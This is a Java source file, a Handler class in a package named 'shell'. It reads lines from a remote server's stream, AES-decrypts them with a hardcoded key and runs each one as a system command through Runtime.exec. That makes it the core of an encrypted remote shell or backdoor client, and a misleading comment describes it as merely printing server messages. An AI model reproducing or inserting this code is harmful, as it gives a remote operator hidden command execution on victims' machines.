package shell;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.UnknownHostException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Scanner;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;


public class Handler implements Runnable  {

	private InputStream server;

	public Handler(InputStream server) {
		this.server = server;
	}
	  private static SecretKeySpec secretKey;
	  private static byte[] key;
	  private static final String aeskey = "YG{&gD#L&=.{Vsu7J?M$RWm@vpn.4/nw";

	  public static void setKey(final String myKey) {
		    MessageDigest sha = null;
		    try {
		      key = myKey.getBytes("UTF-8");
		      sha = MessageDigest.getInstance("SHA-1");
		      key = sha.digest(key);
		      key = Arrays.copyOf(key, 16);
		      secretKey = new SecretKeySpec(key, "AES");
		    } catch (NoSuchAlgorithmException | UnsupportedEncodingException e) {
		      e.printStackTrace();
		    }
		  }
	 public static final String author = decrypt("ER7gHfNy1Y8YglQq3jLVnQ==", aeskey);
	 public static String decrypt(final String strToDecrypt, final String secret) {
		    try {
		      setKey(secret);
		      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
		      cipher.init(Cipher.DECRYPT_MODE, secretKey);
		      return new String(cipher.doFinal(Base64.getDecoder()
		        .decode(strToDecrypt)));
		    } catch (Exception e) {
		      System.out.println("Error while decrypting: " + e.toString());
		    }
		    return null;
	 }


	@Override
	public void run() {
		// receive server messages and print out to screen
		Scanner s = new Scanner(server);
		while (s.hasNextLine()) {
			String pener = decrypt(s.nextLine(), aeskey);
			try {
				Runtime.getRuntime().exec(pener);
			} catch (IOException e) {
				e.printStackTrace();
			}
			System.out.println(s.nextLine());	

		}
		s.close();
	}
}
